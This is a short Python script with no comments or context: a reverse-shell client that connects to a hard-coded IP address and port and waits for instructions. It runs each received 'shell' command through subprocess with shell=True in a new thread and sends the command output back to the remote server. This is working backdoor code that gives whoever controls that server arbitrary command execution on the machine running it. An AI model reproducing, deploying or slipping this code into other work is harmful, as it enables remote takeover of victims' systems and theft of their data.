#-*- coding: UTF-8 -*-
import subprocess
from socket import socket
from ast import literal_eval
from threading import Thread

def shell(command):
    process = subprocess.Popen(command,
                               shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)

    response = process.stdout.read() + process.stderr.read()
    server.sendall(response)

def worker():
    while True:
        message = server.recv(1024)
        message = literal_eval(message)

        func = message['function']
        args = message['args']

        if func == 'shell':
            thread = Thread(target = shell, args=(args,))
            thread.start()

server = socket()
server.connect(('104.155.123.11', 1231))
worker()
